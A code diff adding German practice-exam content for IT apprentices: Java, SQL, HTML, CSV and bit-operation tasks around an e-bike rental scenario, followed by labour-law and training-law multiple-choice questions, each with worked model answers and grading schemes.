+          'Hinweis: In Java ist StationVollException eine **geprüfte Exception** (erbt von Exception), deshalb muss sie mit throws deklariert und vom Aufrufer behandelt werden. Nicht während einer for-each-Schleife aus der Liste entfernen (ConcurrentModificationException).', 'Bewertung: Exception-Klasse (2 P), Suche und Entfernen (3 P), Exception bei Nichtfinden (1 P), Kapazitätsprüfung und Hinzufügen (2 P).'],
+        see: ['eua-exceptions', 'eua-oop']},
+      {pts: 4, topic: 'Collections', q: 'Ordnen Sie jeder Anforderung die am besten geeignete Datenstruktur zu.',
+        match: {keys: ['Liste (ArrayList / list)', 'Map (HashMap / dict)', 'Warteschlange (Queue / deque)', 'Menge (HashSet / set)', 'Stapel (Stack)'], items: [
+          ['Kundendaten sollen über die Kundennummer in konstanter Zeit gefunden werden.', 1], ['Reservierungen für ein E-Bike werden in der Reihenfolge ihres Eingangs abgearbeitet.', 2],
+          ['Die Stadtteile, in denen ein Kunde schon gefahren ist, ohne Duplikate.', 3], ['Die Räder einer Station in Rückgabereihenfolge mit Zugriff über den Index.', 0],
+        ]},
+        a: ['**Map**: Schlüssel-Wert-Zugriff in O(1) im Mittel. **Queue**: FIFO. **Set**: keine Duplikate, schnelle Enthaltenseins-Prüfung. **Liste**: Reihenfolge und Indexzugriff. Ein **Stack** (LIFO) passt zum Beispiel zur Rückgängig-Funktion oder zur Auswertung von Klammerausdrücken.'],
+        see: ['eua-listen', 'eua-hash', 'eua-stackqueue']},
+      {pts: 7, rows: 7, topic: 'Programmausgabe', q: 'Welche Ausgabe erzeugt das Programm? Begründen Sie die Werte in der vierten und fünften Ausgabezeile.',
+        ctx: [['code', 'java', `class Rad {
+    static int anzahl = 0;
+    protected String typ = "Rad";
+    Rad() { anzahl++; System.out.println("Rad erstellt"); }
+    double preis(int min) { return min * 0.05; }
+    public String toString() { return typ + " #" + anzahl; }
+}
+
+class EBike extends Rad {
+    EBike() { super(); typ = "E-Bike"; System.out.println("E-Bike erstellt"); }
+    @Override double preis(int min) { return super.preis(min) * 2; }
+}
+
+public static void main(String[] args) {
+    Rad a = new Rad();
+    Rad b = new EBike();
+    System.out.println(a + " / " + b);
+    System.out.println(a.preis(20) + " " + b.preis(20));
+    System.out.println(Rad.anzahl);
+}`]],
+        a: [['out', `Rad erstellt
+Rad erstellt
+E-Bike erstellt
+Rad #2 / E-Bike #2
+1.0 2.0
+2`], '- new EBike() ruft zuerst über **super()** den Konstruktor von Rad auf ("Rad erstellt"), erst dann den Rest des EBike-Konstruktors.', '- **anzahl ist static**: Es gibt sie nur **einmal für die Klasse**. Beim Ausgeben ist sie bereits 2, deshalb zeigen **beide** Objekte "#2" (Falle!).', '- b.preis(20) nutzt dank **dynamischer Bindung** die überschriebene Methode: super.preis(20) = 1,0, mal 2 = **2.0**.', 'Bewertung: Zeilen 1 bis 3 (2 P), Zeile 4 (2 P), Zeile 5 (2 P), Zeile 6 (1 P).'],
+        see: ['eua-konstruktor', 'eua-saeulen']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 3: Datenbankabfragen (25 Punkte)',
+    ctx: [['h3', 'Anlage: Tabellen mit Beispieldaten (Stand 02.11.2026, 15:00 Uhr)'],
+      ['row', [['table', ['station_id', 'name', 'stadtteil'], [['1', 'Hauptbahnhof', 'Zentrum'], ['2', 'Augustusplatz', 'Zentrum'], ['3', 'Connewitzer Kreuz', 'Connewitz'], ['4', 'Plagwitz Bf', 'Plagwitz']]],
+        ['table', ['kunde_id', 'name', 'abo'], [['1', 'Lena Vogel', '1'], ['2', 'Max Richter', '0'], ['3', 'Sara Ahmadi', '1'], ['4', 'Paul Schmidt', '0']]]]],
+      ['table', ['rad_id', 'typ', 'station_id'], [['11', 'E-Bike', 'NULL'], ['12', 'Classic', '1'], ['13', 'E-Bike', 'NULL'], ['14', 'Classic', '3'], ['15', 'E-Bike', '4']]],
+      ['table', ['ausleihe_id', 'kunde_id', 'rad_id', 'start_station', 'ziel_station', 'start_zeit', 'ende_zeit', 'preis'], [['1', '1', '12', '1', '2', '07:50', '08:05', '0.00'], ['2', '2', '14', '2', '3', '08:10', '08:52', '1.50'], ['3', '3', '15', '3', '4', '09:00', '09:41', '0.50'], ['4', '2', '12', '2', '1', '12:00', '13:20', '3.00'], ['5', '4', '11', '1', 'NULL', '14:05', 'NULL', 'NULL'], ['6', '1', '13', '4', 'NULL', '14:30', 'NULL', 'NULL']]],
+      ['note', 'Alle Zeiten am 02.11.2026 (im Datenbankschema als DATETIME). Fremdschlüssel: ausleihe.kunde_id → kunde, ausleihe.rad_id → rad, ausleihe.start_station und ausleihe.ziel_station → station, rad.station_id → station.']],
+    tasks: [
+      {pts: 4, topic: 'JOIN mit NULL-Bedingung', q: 'Geben Sie alle **laufenden** Ausleihen aus: Kundenname, Rad-ID und Name der Startstation.',
+        a: [['code', 'sql', `SELECT k.name, a.rad_id, s.name AS startstation
+FROM ausleihe a
+JOIN kunde k   ON k.kunde_id   = a.kunde_id
+JOIN station s ON s.station_id = a.start_station
+WHERE a.ende_zeit IS NULL;`], ['table', ['name', 'rad_id', 'startstation'], [['Paul Schmidt', '11', 'Hauptbahnhof'], ['Lena Vogel', '13', 'Plagwitz Bf']]], 'Falle: **= NULL** ist nie wahr; Vergleiche mit NULL immer mit **IS NULL** bzw. IS NOT NULL.'],
+        see: ['eua-sqljoin', 'eua-sqlselect']},
+      {pts: 5, topic: 'GROUP BY', q: 'Ermitteln Sie je **Stadtteil der Startstation** die Anzahl der **abgeschlossenen** Ausleihen und den Umsatz, nach Umsatz absteigend sortiert.',
+        a: [['code', 'sql', `SELECT s.stadtteil,
+       COUNT(*)     AS ausleihen,
+       SUM(a.preis) AS umsatz
+FROM ausleihe a
+JOIN station s ON s.station_id = a.start_station
+WHERE a.ende_zeit IS NOT NULL
+GROUP BY s.stadtteil
+ORDER BY umsatz DESC;`], ['table', ['stadtteil', 'ausleihen', 'umsatz'], [['Zentrum', '3', '4.50'], ['Connewitz', '1', '0.50']]],
+          'Zentrum: Ausleihen 1 (0,00), 2 (1,50) und 4 (3,00). Plagwitz fehlt, weil die einzige dort gestartete Ausleihe (6) noch läuft.'],
+        see: ['eua-sqlgroup']},
+      {pts: 5, topic: 'Tabelle doppelt joinen', q: 'Erstellen Sie eine Liste aller abgeschlossenen Ausleihen mit ausleihe_id, **Name der Startstation** und **Name der Zielstation**. Wie müssten Sie die Abfrage ändern, damit auch laufende Ausleihen (ohne Ziel) erscheinen?',
+        a: [['code', 'sql', `SELECT a.ausleihe_id,
+       st.name AS start,
+       zi.name AS ziel
+FROM ausleihe a
+JOIN station st ON st.station_id = a.start_station
+JOIN station zi ON zi.station_id = a.ziel_station
+ORDER BY a.ausleihe_id;`], ['table', ['ausleihe_id', 'start', 'ziel'], [['1', 'Hauptbahnhof', 'Augustusplatz'], ['2', 'Augustusplatz', 'Connewitzer Kreuz'], ['3', 'Connewitzer Kreuz', 'Plagwitz Bf'], ['4', 'Augustusplatz', 'Hauptbahnhof']]],
+          'Die Tabelle station wird **zweimal mit verschiedenen Aliasen** eingebunden (eine Rolle je Fremdschlüssel). Der INNER JOIN auf ziel_station filtert laufende Ausleihen (NULL) heraus. Für alle Ausleihen: **LEFT JOIN station zi ...**; ziel ist dann NULL (mit COALESCE(zi.name, \'unterwegs\') lesbar).'],
+        see: ['eua-sqljoin', 'eua-sqlexam']},
+      {pts: 4, topic: 'Verschachtelte Aggregation', q: 'Geben Sie die Namen der Kunden aus, deren **Gesamtumsatz** über dem **durchschnittlichen Gesamtumsatz pro Kunde** liegt.',
+        a: [['code', 'sql', `SELECT k.name, SUM(a.preis) AS umsatz
+FROM kunde k
+JOIN ausleihe a ON a.kunde_id = k.kunde_id
+GROUP BY k.kunde_id, k.name
+HAVING SUM(a.preis) > (
+    SELECT AVG(summe)
+    FROM (SELECT SUM(preis) AS summe
+          FROM ausleihe
+          GROUP BY kunde_id) AS je_kunde
+);`], ['table', ['name', 'umsatz'], [['Max Richter', '4.50']]],
+          'Umsätze je Kunde: Lena 0,00, Max 4,50, Sara 0,50, Paul NULL (nur laufende Ausleihe). **AVG ignoriert NULL**: (0 + 4,5 + 0,5) / 3 ≈ 1,67. Nur Max liegt darüber. Aggregatfunktionen lassen sich nicht direkt schachteln (AVG(SUM(...)) ist in Standard-SQL nicht erlaubt), deshalb die Unterabfrage in FROM.'],
+        sol: [['walk', {t: 'Von innen nach außen', steps: [
+          {t: '**Innerste Abfrage:** Summe je Kunde.', b: [['table', ['kunde_id', 'summe'], [['1', '0.00'], ['2', '4.50'], ['3', '0.50'], ['4', 'NULL']]]]},
+          {t: '**AVG(summe):** NULL zählt nicht mit: 5,00 / 3 = **1,67**.', b: [['chart', {kind: 'bar', w: 560, h: 220, labels: ['Lena', 'Max', 'Sara'], series: [{n: 'Umsatz', d: [0, 4.5, 0.5], k: 'accent'}], vals: true, ymax: 5, cap: 'Nur Max liegt über dem Durchschnitt von 1,67 Euro'}]]},
+          {t: '**HAVING** vergleicht jede Kundensumme mit 1,67: Ergebnis **Max Richter**.'},
+        ]}]],
+        see: ['eua-sqlgroup', 'eua-sqlexam']},
+      {pts: 3, topic: 'ALTER TABLE', q: 'Die Tabelle rad soll die Spalte **akku_prozent** erhalten: ganze Zahl von 0 bis 100, bei klassischen Rädern leer. Schreiben Sie die Anweisung und setzen Sie für **Rad 15** den Wert 64.',
+        a: [['code', 'sql', `ALTER TABLE rad
+  ADD akku_prozent SMALLINT NULL
+      CHECK (akku_prozent BETWEEN 0 AND 100);
+
+UPDATE rad SET akku_prozent = 64 WHERE rad_id = 15;`], 'Ein CHECK mit NULL ist erfüllt (NULL ergibt "unbekannt", nicht "falsch"), deshalb sind klassische Räder ohne Wert zulässig.'],
+        see: ['eua-sqldml']},
+      {pts: 4, topic: 'NoSQL', q: 'Die GPS-Spuren jeder Fahrt (alle 10 Sekunden ein Punkt) sollen gespeichert werden. a) Warum eignet sich eine **dokumentenorientierte Datenbank** dafür besser als eine relationale Tabelle? b) Skizzieren Sie ein JSON-Dokument für eine Fahrt. c) Nennen Sie einen Nachteil.',
+        a: ['a) Eine Fahrt mit allen Punkten ist **ein zusammenhängendes Dokument**, das immer als Ganzes gelesen wird (keine Joins). **Flexibles Schema** (neue Sensorfelder ohne ALTER TABLE), **horizontale Skalierung** bei sehr großen Datenmengen, schnelles Schreiben.', ['code', 'json', `{
+  "ausleiheId": 4,
+  "radId": 12,
+  "start": "2026-11-02T12:00:00",
+  "punkte": [
+    { "t": "12:00:00", "lat": 51.3397, "lon": 12.3731 },
+    { "t": "12:00:10", "lat": 51.3399, "lon": 12.3740, "kmh": 14.2 }
+  ]
+}`], 'c) Schwächere **Konsistenzgarantien** (oft BASE statt ACID), keine Fremdschlüssel, Auswertungen über viele Dokumente und Joins mit relationalen Daten sind aufwendiger, Datenredundanz.'],
+        see: ['eua-nosql', 'eua-formate']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 4: Web, Daten und Tests (25 Punkte)',
+    tasks: [
+      {pts: 6, rows: 10, topic: 'HTML-Formular', q: 'Erstellen Sie das HTML-Formular für die Registrierung: **Name** (Pflicht), **E-Mail** (Pflicht, als E-Mail geprüft), **Geburtsdatum** (Datumsfeld), **Tarif** als Auswahl zwischen "Basis" und "Abo", Kontrollkästchen **"Ich akzeptiere die AGB"** (Pflicht) und ein Absendeknopf. Die Daten werden per **POST** an /api/registrierung gesendet. Achten Sie auf Barrierefreiheit.',
+        a: [['code', 'html', `<form action="/api/registrierung" method="post">
+  <label for="name">Name</label>
+  <input id="name" name="name" type="text" required autocomplete="name">
+
+  <label for="mail">E-Mail</label>
+  <input id="mail" name="email" type="email" required autocomplete="email">
+
+  <label for="geb">Geburtsdatum</label>
+  <input id="geb" name="geburtsdatum" type="date">
+
+  <label for="tarif">Tarif</label>
+  <select id="tarif" name="tarif">
+    <option value="basis">Basis</option>
+    <option value="abo">Abo</option>
+  </select>
+
+  <label><input type="checkbox" name="agb" required> Ich akzeptiere die AGB</label>
+
+  <button type="submit">Registrieren</button>
+</form>`], 'Bewertung: form mit action und method (1 P), passende input-Typen (2 P), required (1 P), label-Verknüpfung (1 P), select und checkbox (1 P). Wichtig: Die Prüfung im Browser ersetzt **nicht** die Prüfung auf dem Server.'],
+        sol: [['result', {t: 'So sieht das Formular aus', h: 380, html: `<form>
+  <label for="name">Name</label><input id="name" required>
+  <label for="mail">E-Mail</label><input id="mail" type="email" required>
+  <label for="geb">Geburtsdatum</label><input id="geb" type="date">
+  <label for="tarif">Tarif</label><select id="tarif"><option>Basis</option><option>Abo</option></select>
+  <label class="c"><input type="checkbox" required> Ich akzeptiere die AGB</label>
+  <button>Registrieren</button>
+</form>`, css: `form { font: 15px/1.4 system-ui, sans-serif; display: grid; gap: 4px; max-width: 320px; }
+label { font-weight: 600; margin-top: 6px; } label.c { font-weight: 400; display: flex; gap: 8px; align-items: center; }
+input, select { padding: 7px; font-size: 15px; border: 1px solid #777; border-radius: 6px; }
+button { margin-top: 10px; padding: 9px; background: #1565c0; color: #fff; border: 0; border-radius: 6px; font-size: 15px; }`}]],
+        see: ['eua-html']},
+      {pts: 6, rows: 11, topic: 'CSV verarbeiten', q: 'Die Schlösser liefern einmal pro Stunde eine CSV-Datei (Trennzeichen Semikolon, erste Zeile ist die Kopfzeile). Schreiben Sie eine Funktion **akkuJeStation(zeilen)**, die eine Liste von Textzeilen erhält und je Station den **durchschnittlichen Akkustand** zurückgibt. Zeilen mit fehlendem Akkuwert werden übersprungen.',
+        ctx: [['code', 'text', `rad_id;akku;station
+11;15;Hauptbahnhof
+13;80;Augustusplatz
+15;55;Hauptbahnhof
+16;;Plagwitz Bf`]],
+        a: [['codes', [['python', `def akku_je_station(zeilen):
+    summe, anzahl = {}, {}
+    for zeile in zeilen[1:]:                 # Kopfzeile überspringen
+        teile = zeile.strip().split(";")
+        if len(teile) < 3 or teile[1] == "":
+            continue                         # fehlender Wert
+        akku, station = int(teile[1]), teile[2]
+        summe[station] = summe.get(station, 0) + akku
+        anzahl[station] = anzahl.get(station, 0) + 1
+    return {s: summe[s] / anzahl[s] for s in summe}`], ['java', `static Map<String, Double> akkuJeStation(List<String> zeilen) {
+    Map<String, Integer> summe = new HashMap<>(), anzahl = new HashMap<>();
+    for (String zeile : zeilen.subList(1, zeilen.size())) {
+        String[] t = zeile.trim().split(";", -1);
+        if (t.length < 3 || t[1].isEmpty()) continue;
+        int akku = Integer.parseInt(t[1]);
+        summe.merge(t[2], akku, Integer::sum);
+        anzahl.merge(t[2], 1, Integer::sum);
+    }
+    Map<String, Double> schnitt = new HashMap<>();
+    for (String s : summe.keySet()) schnitt.put(s, (double) summe.get(s) / anzahl.get(s));
+    return schnitt;
+}`]]], 'Ergebnis für das Beispiel: **Hauptbahnhof 35,0**, **Augustusplatz 80,0**; Plagwitz Bf erscheint nicht (kein gültiger Wert).', 'Bewertung: Kopfzeile überspringen (1 P), Zerlegen (1 P), fehlende Werte überspringen (1 P), Summen und Zähler je Station in einer Map (2 P), Durchschnitt (1 P).'],
+        sol: [['out', `{'Hauptbahnhof': 35.0, 'Augustusplatz': 80.0}`], ['tip', 'In Java liefert "16;;Plagwitz Bf".split(";") zwar drei Teile, endet eine Zeile aber mit leeren Feldern, fallen diese ohne den Parameter -1 weg. Deshalb split(";", -1).']],
+        see: ['eua-dateien', 'eua-formate']},
+      {pts: 7, rows: 9, topic: 'Grenzwerttests', q: 'Erstellen Sie für preis(minuten, abo) aus Aufgabe 1.1 eine Testfalltabelle mit **mindestens sechs Grenzwert-Testfällen** (Eingaben und erwartetes Ergebnis), darunter der Übergang zur Deckelung und der Abo-Fall. Ist dieser Test ein Black-Box- oder ein White-Box-Test? Begründen Sie.',
+        a: [['table', ['Nr.', 'minuten', 'abo', 'erwartet', 'Grenze'], [['1', '0', 'false', 'Fehler', 'unterhalb gültig'], ['2', '1', 'false', '1,00', 'kleinste gültige Dauer'], ['3', '30', 'false', '1,00', 'Ende Grundpreis'], ['4', '31', 'false', '1,50', 'erster Zusatzblock'], ['5', '45', 'false', '1,50', 'Ende erster Block'], ['6', '46', 'false', '2,00', 'zweiter Block'], ['7', '435', 'false', '14,50', 'letzte Stufe vor dem Deckel'], ['8', '436', 'false', '15,00', 'Deckel erreicht'], ['9', '20', 'true', '0,00', 'Abo, nie negativ'], ['10', '500', 'true', '14,00', 'Deckel vor Abo-Abzug']]],
+          'Es ist ein **Black-Box-Test**: Die Testfälle werden aus der **Spezifikation** (Tarifbeschreibung) mit Äquivalenzklassen und Grenzwerten abgeleitet, ohne den Quellcode zu kennen. Ein White-Box-Test orientiert sich an der Programmstruktur (Anweisungs-, Zweigüberdeckung).', 'Bewertung: sechs korrekte Testfälle (je 0,75 P, darunter Deckel und Abo), Black-Box mit Begründung (2,5 P).'],
+        sol: [['ex', 'Rechenweg für 435 Minuten: 435 - 30 = 405 Minuten; 405 / 15 = 27 Blöcke (genau, nicht aufgerundet); 1,00 + 27 x 0,50 = 14,50 Euro. Bei 436 Minuten sind es 28 Blöcke: 15,00 Euro, also genau der Deckel.']],
+        see: ['eua-testfaelle', 'eua-unittest', 'ps-testarten']},
+      {pts: 6, rows: 8, topic: 'Bitoperationen', q: 'Jedes Schloss meldet seinen Zustand in einem **Statusbyte**: Bit 0 verriegelt, Bit 1 Akku niedrig, Bit 2 GPS-Empfang, Bit 3 Sabotagealarm, Bit 4 Wartung nötig, Bit 5 LTE verbunden, Bit 6 lädt, Bit 7 reserviert. Empfangen wird **0x2D**. a) Wandeln Sie den Wert in Binär- und Dezimaldarstellung um und geben Sie alle gesetzten Zustände an. b) Geben Sie Ausdrücke an, mit denen Sie prüfen, ob der Sabotagealarm gesetzt ist, und mit denen Sie Bit 1 setzen und Bit 3 löschen. Welche Werte entstehen jeweils?',
+        a: ['a) 0x2D = 2 · 16 + 13 = **45** = **0010 1101**. Gesetzt sind Bit 0 (**verriegelt**), Bit 2 (**GPS-Empfang**), Bit 3 (**Sabotagealarm**) und Bit 5 (**LTE verbunden**).', ['code', 'java', `boolean sabotage = (status & 0x08) != 0;   // 0010 1101 & 0000 1000 = 0000 1000 -> true
+int mitAkkuWarnung = status | 0x02;         // 0010 1111 = 0x2F = 47
+int ohneAlarm      = status & ~0x08;        // 0010 0101 = 0x25 = 37`],
+          'Bewertung: Umrechnung (2 P), Zustände (1 P), Prüfen mit UND-Maske (1 P), Setzen mit ODER (1 P), Löschen mit UND und invertierter Maske (1 P).'],
+        sol: [['table', ['Bit', '7', '6', '5', '4', '3', '2', '1', '0'], [['Wertigkeit', '128', '64', '32', '16', '8', '4', '2', '1'], ['0x2D', '0', '0', '**1**', '0', '**1**', '**1**', '0', '**1**'], ['Bedeutung', 'res.', 'lädt', '**LTE**', 'Wartung', '**Sabotage**', '**GPS**', 'Akku niedrig', '**verriegelt**']]], ['tool', 'bin']],
+        see: ['eua-bits']},
+    ],
+  });
+  AP2.exam.end(ID);
+})();
+;
+// content/exam/wiso5-1.js
+// Probeprüfung 5, Wirtschafts- und Sozialkunde: gebundene Aufgaben (Situation Saxon Apps GmbH / VeloCity Leipzig GmbH).
+(function () {
+  const ID = 'exam5-wiso';
+  AP2.page(ID, {b: 'exam', g: 'Probeprüfung 5 (Mobilität)', t: 'Wirtschafts- und Sozialkunde (gebundene Aufgaben)', blocks: []});
+  AP2.exam.start(ID, {minutes: 60, cover: AP2.exam.COVER.wiso,
+    hint: 'Schwerpunkte: Berufsschule und Teilzeitausbildung, Weiterbildung, Mutterschutz, Gewerkschaften und Kammern, Lohnsteuerklassen, Entgeltabrechnung, Insolvenz, Konjunkturindikatoren, Break-even, Zusammenschlüsse, EU, KI-Verordnung, Geschäftsfähigkeit.',
+    intro: [['p', 'Sie sind Auszubildende bzw. Auszubildender bei der **Saxon Apps GmbH** in Dresden (48 Beschäftigte, Betriebsrat, tarifungebunden) und arbeiten im Projekt für die **VeloCity Leipzig GmbH**.']]});
+  AP2.exam.part(ID, {
+    t: 'Aufgabengruppe 1: Ausbildung, Weiterbildung und Arbeitsrecht (35 Punkte)',
+    tasks: [
+      {pts: 3, topic: 'Berufsschule', q: 'Sie sind 22 Jahre alt und haben montags **6 Unterrichtsstunden** (je 45 Minuten) Berufsschule. Ihre tägliche Ausbildungszeit im Betrieb beträgt durchschnittlich 8 Stunden. Was gilt nach dem BBiG?',
+        mc: {o: ['Sie müssen nach der Berufsschule in den Betrieb zurück, weil Sie volljährig sind.', 'Der Berufsschultag wird mit der durchschnittlichen täglichen Ausbildungszeit angerechnet; Sie müssen nicht mehr in den Betrieb.', 'Nur die tatsächliche Unterrichtszeit von 4,5 Stunden wird angerechnet.', 'Die Berufsschulzeit ist Freizeit und wird nicht angerechnet.'], c: [1]},
+        a: ['§ 15 BBiG (seit 2020 für **alle** Auszubildenden, unabhängig vom Alter): Ein Berufsschultag mit **mehr als fünf Unterrichtsstunden** von mindestens je 45 Minuten wird **einmal in der Woche** mit der **durchschnittlichen täglichen Ausbildungszeit** angerechnet. Eine Beschäftigung danach ist nicht zulässig. Auch Pausen und Wegezeiten zwischen Schule und Betrieb werden angerechnet.'], see: ['wiso-bbig']},
+      {pts: 3, topic: 'Ausbildungsnachweis', q: 'Welche Aussage zum **Ausbildungsnachweis** ist richtig?',
+        mc: {o: ['Er darf nur handschriftlich geführt werden.', 'Er wird schriftlich oder elektronisch geführt; der Ausbildende muss Gelegenheit geben, ihn während der Ausbildungszeit zu führen, und ihn regelmäßig durchsehen.', 'Er ist freiwillig und nur für die Bewerbung nützlich.', 'Er wird von der Berufsschule geführt und an die IHK gesendet.'], c: [1]},
+        a: ['§ 13 Nr. 7 und § 14 Abs. 2 BBiG: Auszubildende müssen den Ausbildungsnachweis führen; Ausbildende halten dazu an, geben **während der Ausbildungszeit** Gelegenheit und sehen ihn **regelmäßig durch**. Er kann **schriftlich oder elektronisch** geführt werden (im Vertrag festgelegt) und ist **Zulassungsvoraussetzung** zur Abschlussprüfung.'], see: ['wiso-bbig']},
+      {pts: 3, topic: 'Teilzeitausbildung', q: 'Eine Bewerberin pflegt ihre Mutter und möchte die Ausbildung in Teilzeit absolvieren. Was ist richtig?',
+        mc: {o: ['Teilzeitausbildung ist nur für Alleinerziehende zulässig.', 'Ausbildende und Auszubildende können eine Teilzeitausbildung vereinbaren; die tägliche oder wöchentliche Zeit darf um höchstens 50 % gekürzt werden.', 'Teilzeitausbildung ist nur in Berufen mit 2-jähriger Ausbildungsdauer möglich.', 'Bei Teilzeit entfällt die Berufsschulpflicht.'], c: [1]},
+        a: ['§ 7a BBiG: Teilzeitausbildung kann **für alle** vereinbart werden (kein besonderer Grund erforderlich), Kürzung um **höchstens 50 %**. Die Ausbildungsdauer verlängert sich entsprechend, höchstens auf das 1,5-Fache der regulären Dauer; die Vergütung darf anteilig sinken.'], see: ['wiso-bbig']},
+      {pts: 4, topic: 'Weiterbildung', q: 'Ordnen Sie die Maßnahmen der passenden Form der beruflichen Weiterbildung zu.',
+        match: {keys: ['Anpassungsweiterbildung', 'Aufstiegsweiterbildung', 'Umschulung'], items: [['Schulung zur neuen Version des eingesetzten Cloud-Dienstes', 0], ['Prüfung zum Bachelor Professional in IT (Geprüfter Operativer Professional)', 1], ['Ein Busfahrer erlernt den Beruf Fachinformatiker', 2], ['Kurs zu neuen Anforderungen des Barrierefreiheitsstärkungsgesetzes', 0]]},
+        a: ['**Anpassung**: Wissen an neue Anforderungen im **bisherigen** Beruf anpassen. **Aufstieg**: höher qualifizierender Abschluss (Fortbildungsprüfungen der IHK, zum Beispiel Bachelor Professional, Master Professional). **Umschulung**: Befähigung zu einem **anderen** Beruf.'], see: ['wiso-weiterbildung']},
+      {pts: 3, topic: 'Aufstiegs-BAföG', q: 'Welche Aussage zum **Aufstiegs-BAföG** ("Meister-BAföG") ist richtig?',
+        mc: {o: ['Es wird nur für Hochschulstudiengänge gezahlt.', 'Es fördert Aufstiegsfortbildungen wie den Bachelor Professional, teils als Zuschuss, teils als zinsgünstiges Darlehen, unabhängig vom Alter.', 'Es muss vollständig mit Zinsen zurückgezahlt werden.', 'Nur Personen unter 25 Jahren können es erhalten.'], c: [1]},
+        a: ['Das **AFBG** fördert Lehrgangs- und Prüfungsgebühren (zum Teil als **Zuschuss**, Rest als günstiges **Darlehen**, bei Bestehen teilweise Erlass) sowie in Vollzeit den Lebensunterhalt. Es gibt **keine Altersgrenze**. Die Fortbildung muss auf eine öffentlich-rechtliche Prüfung (zum Beispiel IHK) vorbereiten.'], see: ['wiso-weiterbildung']},
+      {pts: 3, topic: 'Mutterschutz', q: 'Eine Kollegin teilt mit, dass sie schwanger ist. Welche Aussage ist richtig?',
+        mc: {o: ['Der Arbeitgeber darf ihr während der Probezeit trotzdem jederzeit kündigen.', 'Eine Kündigung ist während der Schwangerschaft und bis vier Monate nach der Entbindung grundsätzlich unzulässig.', 'Sie verliert während der Schutzfristen ihren Anspruch auf Erholungsurlaub.', 'Sie muss die Schwangerschaft dem Betriebsrat mitteilen.'], c: [1]},
+        a: ['§ 17 MuSchG: **Kündigungsverbot** während der Schwangerschaft und bis **vier Monate nach der Entbindung** (auch in der Probezeit), Ausnahmen nur mit Zustimmung der Aufsichtsbehörde. Schutzfristen: 6 Wochen vor, 8 Wochen nach der Geburt; Urlaub wird für die Schutzfristen nicht gekürzt. Mitteilen soll sie es dem **Arbeitgeber**.'], see: ['wiso-arbeitsvertrag']},
+      {pts: 3, topic: 'Kündigungsfrist Arbeitnehmer', q: 'Ein Entwickler ist seit **12 Jahren** bei der Saxon Apps GmbH beschäftigt und möchte kündigen. Vertraglich und tariflich ist nichts geregelt. Welche Frist muss **er** einhalten?',
+        mc: {o: ['5 Monate zum Monatsende', '4 Wochen zum 15. oder zum Ende eines Kalendermonats', '2 Wochen', '3 Monate zum Quartalsende'], c: [1]},
+        a: ['Die **verlängerten Fristen** nach § 622 Abs. 2 BGB gelten nur für Kündigungen **durch den Arbeitgeber**. Der Arbeitnehmer kann mit der Grundfrist von **4 Wochen zum 15. oder zum Monatsende** kündigen (§ 622 Abs. 1). Vertraglich darf für ihn keine längere Frist als für den Arbeitgeber vereinbart werden.'], see: ['wiso-kuendigung']},
+      {pts: 4, topic: 'Gewerkschaft', q: 'Welche Aufgaben übernimmt eine **Gewerkschaft**? Kreuzen Sie **zwei** Antworten an.',
+        mc: {o: ['Tarifverträge mit Arbeitgeberverbänden oder einzelnen Arbeitgebern aushandeln', 'Den Betriebsrat wählen', 'Ihren Mitgliedern Rechtsschutz in arbeitsrechtlichen Streitigkeiten gewähren', 'Ausbildungsverträge in das Verzeichnis eintragen', 'Arbeitslosengeld auszahlen'], c: [0, 2]},
+        a: ['Gewerkschaften sind freiwillige Zusammenschlüsse von Arbeitnehmern (Koalitionsfreiheit, Art. 9 Abs. 3 GG): **Tarifverhandlungen**, Arbeitskämpfe, **Beratung und Rechtsschutz** für Mitglieder, Schulungen für Betriebsräte, politische Interessenvertretung. Den Betriebsrat wählen die **Beschäftigten**, Ausbildungsverträge trägt die **IHK** ein, Arbeitslosengeld zahlt die **Bundesagentur für Arbeit**.'], see: ['wiso-gewerkschaft']},
+      {pts: 3, topic: 'IHK', q: 'Welche Aufgabe hat die **Industrie- und Handelskammer** in der Berufsausbildung?',
+        mc: {o: ['Sie zahlt die Ausbildungsvergütung.', 'Sie führt das Verzeichnis der Berufsausbildungsverhältnisse, überwacht die Ausbildung, berät und nimmt die Prüfungen ab.', 'Sie erstellt die Lehrpläne der Berufsschulen.', 'Sie wählt die Auszubildenden für die Betriebe aus.'], c: [1]},
+        a: ['Die IHK ist **zuständige Stelle** nach dem BBiG: Eintragung der Verträge, **Überwachung und Beratung** (Ausbildungsberater), Prüfung der Eignung von Ausbildungsstätte und Ausbildern, **Prüfungsausschüsse**, Verkürzung und Verlängerung der Ausbildung, Schlichtung. Rahmenlehrpläne erstellt die Kultusministerkonferenz, Lehrpläne die Länder.'], see: ['wiso-kammern']},
+      {pts: 3, topic: 'Streikrecht', q: 'Wer darf in Deutschland **nicht** streiken?',
+        mc: {o: ['Auszubildende', 'Teilzeitbeschäftigte', 'Beamtinnen und Beamte', 'Nicht gewerkschaftlich organisierte Arbeitnehmer'], c: [2]},
+        a: ['**Beamte** haben wegen der hergebrachten Grundsätze des Berufsbeamtentums (Treuepflicht, Alimentation) **kein Streikrecht** (vom Bundesverfassungsgericht 2018 bestätigt). Auszubildende dürfen sich an Warnstreiks beteiligen, wenn ihre Vergütung Verhandlungsgegenstand ist; auch Nicht-Mitglieder dürfen sich an einem rechtmäßigen Streik beteiligen.'], see: ['wiso-tarif', 'wiso-gewerkschaft']},
+      {pts: 3, topic: 'Personalakte', q: 'Ein Mitarbeiter möchte wissen, was in seiner **Personalakte** steht. Welches Recht hat er?',
+        mc: {o: ['Keines, die Personalakte ist ein internes Dokument.', 'Er darf jederzeit Einsicht nehmen und ein Mitglied des Betriebsrats hinzuziehen; er kann Erklärungen beifügen lassen.', 'Er darf nur mit Zustimmung der Geschäftsführung einmal im Jahr Einsicht nehmen.', 'Nur der Betriebsrat darf die Akte einsehen.'], c: [1]},
+        a: ['§ 83 BetrVG: Recht auf **Einsicht** in die vollständige Personalakte, ein **Betriebsratsmitglied** kann hinzugezogen werden, eigene **Erklärungen** sind auf Verlangen beizufügen. Zusätzlich besteht das Auskunftsrecht nach Art. 15 DSGVO.'], see: ['wiso-betriebsrat']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Aufgabengruppe 2: Entgelt und soziale Sicherung (24 Punkte)',
+    tasks: [
+      {pts: 4, topic: 'Lohnsteuerklassen', q: 'Ordnen Sie den Personen die zutreffende Lohnsteuerklasse zu.',
